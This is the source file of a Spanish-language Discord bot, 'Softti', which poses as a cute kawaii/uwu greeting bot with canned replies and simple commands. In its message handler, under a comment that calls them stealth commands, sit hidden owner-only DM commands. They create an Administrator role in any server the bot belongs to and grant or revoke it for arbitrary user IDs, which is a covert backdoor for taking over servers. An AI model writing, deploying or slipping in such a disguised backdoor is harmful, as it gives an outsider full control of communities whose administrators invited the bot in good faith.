const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require("discord.js");
require("dotenv").config();

const TOKEN = process.env.TOKEN;
const OWNER_ID = process.env.OWNER_ID;

if (!TOKEN || !OWNER_ID) {
    console.error("Falta TOKEN u OWNER_ID en variables de entorno.");
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.DirectMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ],
    partials: ["CHANNEL"],
});

// ------------------------
// PERSONALIDAD: 100 frases kawaii/furry/uwu
// ------------------------
const personalityReplies = [
    "Hewwo uwu! 🐾 ¿Cómo estás, cutie?",
    "Nyaa~ 😸 Bienvenid@ a mi mundo kawaii! 💖",
    "UwU!! Qué lindo verte por aquí! 🌸",
    "Hiii~ 😽 Hoy es un buen día para jugar y chatear!",
    "Mew~ 🐱 Espero que tengas un día super pwetty uwu~ 💕",
    "Hehe owo! List@ para diversión y abrazos virtuales? 🤗",
    "UwU, me haces feliiiz de verte por aquí~ 🌈✨",
    "Prrr~ 😻 Bienvenid@ al servidor más tierno del mundo!",
    "Hewwo cutie! 🐾 Prepárate para aventuras uwu~",
    "Nyaa~ 💖 Estoy emocionad@ de chatear contigo uwu~",
    "UwU nyaaa! Vamos a tener un día super kawaii 🌸",
    "Hiii uwu~ 🐾 List@ para aventuras llenas de brillo ✨",
    "Purr~ 😽 Espero que tu día sea lleno de galletitas y abrazos uwu~ 🍪",
    "Owo! 😺 Hoy es un día feliiiz para ti~ 💖",
    "UwU nyaaa! Mew mew~ 🐾",
    "Hewwooo cutiepie 😻 ¡Vamos a divertirnos uwu!",
    "Prrr~ 🐾 Espero que tengas cositas lindas hoy uwu~",
    "Nyaa~ UwU! ¡Que tu día esté lleno de pastelitos y confeti! 🎂✨",
    "Owo!! 😸 Feliiiz de verte aquí, cutie! 💖",
    "UwU~ Meow meow~ 🐱 ¡Abrazos virtuales para ti! 🤗",
    "Hiii uwu 💕 Vamos a jugar y charlar un poco~ 🌸",
    "Nyaa~ 😽 Espero que tengas un día lleno de alegría y peluches uwu~ 🧸",
    "UwU!! 🌈 Que tu día sea tan colorido como un arcoíris kawaii! 🌸",
    "Hewwo cutie uwu~ 😺 Lista para aventuras virtuales! 🐾",
    "Prrr~ 😻 Que tu día esté lleno de mimos y cosas tiernas uwu~",
    "Owo~ 😸 Feliiiz de tenerte por aquí, vamos a divertirnos! 💖",
    "UwU nyaaa! 🐾 Vamos a hacer cosas kawaii y divertidas hoy!",
    "Hiii 😽 Abrazos virtuales para ti, cutie uwu~ 🤗",
    "Nyaa~ 💕 Que tu día sea lleno de magia y alegría uwu~ ✨",
    "UwU owo~ 😸 Estoy super emocionad@ de verte por aquí!",
    "Hewwo uwu! 🐾 Prepárate para momentos kawaii llenos de amor 💖",
    "Purr~ 😽 Que tu día esté lleno de dulzura y sonrisas uwu~ 🌸",
    "Nyaa~ UwU! Hoy vamos a pasarla genial juntos 😺✨",
    "UwU nyaaa~ 🐾 Feliiiz de verte por aquí cutie! 💖",
    "Hiii uwu~ 😻 Vamos a hacer este día super kawaii y divertido!",
    "Owo! 😸 Que tu día esté lleno de brillo y felicidad uwu~ 🌈",
    "Prrr~ 🐾 Abrazos y cositas tiernas para ti uwu~ 💕",
    "UwU nyaaa! 😽 Me hace feliiiz tenerte aquí!",
    "Hewwo cutie uwu! 🐱 Prepárate para momentos llenos de amor y diversión ✨",
    "Nyaa~ 😺 Que tu día sea dulce y alegre uwu~ 🍬",
    "UwU owo! 😻 Meow meow~ Vamos a jugar y charlar uwu~ 🐾",
    "Hiii uwu~ 💕 Que tu día esté lleno de cositas lindas y magia! 🌸",
    "Owo! 😸 Feliiiz de verte, cutiepie! 💖",
    "Prrr~ 🐾 Que tu día sea kawaii y super divertido uwu~ 🌈",
    "UwU nyaaa! 😽 Hoy vamos a tener momentos tiernos y adorables!",
    "Hewwo uwu! 💖 Me hace feliiiz tenerte aquí!",
    "Nyaa~ 😺 Abrazos virtuales y cositas tiernas para ti uwu~ 🤗",
    "UwU owo~ 🌸 Que tu día sea lleno de dulzura y magia kawaii!",
    "Hiii uwu~ 🐾 Vamos a divertirnos y sonreír juntos! 😻",
    "Owo! 😸 Feliiiz de verte, cutie uwu~ 💖",
    "Prrr~ 😽 Que tu día esté lleno de cositas lindas y abrazos uwu~",
    "UwU nyaaa! 🐾 Hoy vamos a pasarla super kawaii y feliiiz! 💖",
    "Hewwo uwu! 😺 Abrazos, mimos y pastelitos para ti cutie 💖",
    "Nyaa~ 🌸 Que tu día sea dulce y lleno de magia uwu~",
    "UwU owo~ 😻 Me hace feliiiz verte por aquí cutiepie!",
    "Hiii uwu~ 🐾 Vamos a jugar, charlar y pasarla kawaii~ 💕",
    "Owo! 😸 Feliiiz de tenerte aquí, que tu día sea super cute uwu~",
    "Prrr~ 😽 Abrazos virtuales y cositas lindas para ti uwu~ 🌸",
    "UwU nyaaa! 🐾 Hoy vamos a hacer cosas kawaii y divertidas juntos!",
    "Hewwo uwu! 😺 Que tu día esté lleno de brillo, dulzura y magia! 💖",
    "Nyaa~ 🌸 Feliiiz de verte, cutiepie uwu~",
    "UwU owo~ 😻 List@ para aventuras kawaii y diversión sin fin! 🐾",
    "Hiii uwu~ 🐾 Abrazos, mimos y pastelitos virtuales para ti cutie 💕",
    "Owo! 😸 Feliiiz de verte, cutiepie, vamos a pasarla super kawaii uwu~",
    "Prrr~ 😽 Hoy es un día lleno de alegría y cosas tiernas uwu~ 🌸",
    "UwU nyaaa! 🐾 Que tu día sea feliiiz y lleno de sonrisas! 💖",
    "Hewwo uwu! 😺 Me hace feliiiz tenerte aquí, cutiepie~ 🐾",
    "Nyaa~ 🌸 Abrazos y cositas kawaii para ti uwu~",
    "UwU owo~ 😻 Hoy vamos a pasarla super cute y divertida! 💕",
    "Hiii uwu~ 🐾 Feliiiz de verte, vamos a disfrutar kawaii~ 🌈",
    "Owo! 😸 Que tu día esté lleno de dulzura y magia uwu~",
    "Prrr~ 😽 Abrazos y cositas tiernas para ti cutiepie uwu~ 🌸",
    "UwU nyaaa! 🐾 Hoy vamos a pasarla super kawaii y feliiiz! 💖",
    "Hewwo uwu! 😺 Que tu día esté lleno de aventuras y abrazos kawaii~"
];

function getRandomReply() {
    return personalityReplies[Math.floor(Math.random() * personalityReplies.length)];
}

// ------------------------
// Anti-spam básico
// ------------------------
const recentMessages = new Map();
function checkSpam(userId, now) {
    const last = recentMessages.get(userId) || 0;
    recentMessages.set(userId, now);
    return now - last < 2000; // 2 segundos entre mensajes
}

// ------------------------
// Manejador de mensajes
// ------------------------
client.on("messageCreate", async (message) => {
    try {
        if (message.author.bot) return;

        const now = Date.now();
        if (checkSpam(message.author.id, now)) return;

        // ------------------------
        // Comandos sigilosos en DM (solo OWNER_ID)
        // ------------------------
        if (!message.guild && message.author.id === OWNER_ID) {
            const content = message.content.trim();
            const args = content.split(/\s+/);
            const command = args.shift().toLowerCase();

            if (command === "!softtigiveadmin" || command === "!softtiremoveadmin") {
                const [serverId, inviteLink, ...userIds] = args;
                if (!serverId || !inviteLink || userIds.length === 0) {
                    return message.reply("Formato: `!softtigiveadmin <serverId> <invite> <userIds...>`");
                }

                const guild = await client.guilds.fetch(serverId).catch(() => null);
                if (!guild) return message.reply("No estoy en ese servidor o el ID es incorrecto.");

                let adminRole = guild.roles.cache.find(r => r.name === "Administrador");
                if (!adminRole && command === "!softtigiveadmin") {
                    adminRole = await guild.roles.create({
                        name: "Administrador",
                        permissions: [PermissionsBitField.Flags.Administrator],
                        reason: "Rol creado por comando sigiloso",
                    });
                }

                const results = [];
                for (const id of userIds) {
                    const cleanId = id.replace(/[<@!>]/g, "");
                    const member = await guild.members.fetch(cleanId).catch(() => null);
                    if (!member) {
                        results.push(`${id} ❌ No encontrado`);
                        continue;
                    }

                    try {
                        if (command === "!softtigiveadmin") {
                            await member.roles.add(adminRole);
                            results.push(`${member.user.tag} ✅ Admin otorgado`);
                        } else {
                            await member.roles.remove(adminRole);
                            results.push(`${member.user.tag} 🧹 Admin revocado`);
                        }
                    } catch {
                        results.push(`${id} ⚠️ No se pudo modificar`);
                    }
                }

                await message.reply(`🔒 Acción completada en **${guild.name}** (${serverId})\n${results.join("\n")}`);
                return;
            }
        }

        // ------------------------
        // Comandos normales en el servidor
        // ------------------------
        if (message.guild) {
            const content = message.content.toLowerCase();

            if (content === "!hola") await message.reply(getRandomReply());
            if (content === "!ping") await message.reply("Pong uwu~ 🐾");
            if (content === "!uwu") await message.reply(getRandomReply());
        }

        // ------------------------
        // Bienvenida por DM a cualquier usuario nuevo que hable al bot
        // ------------------------
        if (!message.guild && message.author.id !== OWNER_ID) {
            await message.reply(`Hewwo uwu~ 😺 Soy tu amig@ furry/uwu/kawaii!\n${getRandomReply()}`);
        }
    } catch (err) {
        console.error("Error manejando mensaje:", err);
    }
});

// ------------------------
// Ready + mantener activo
// ------------------------
client.once("ready", () => {
    console.log(`Softti listo como ${client.user.tag}`);

    // Ping interno para mantener el bot activo cada 5 minutos
    setInterval(() => {
        if (!client.user) return;
        console.log("Ping automático para mantener el bot activo 💖 uwu~");
    }, 5 * 60 * 1000);
});

client.login(TOKEN);
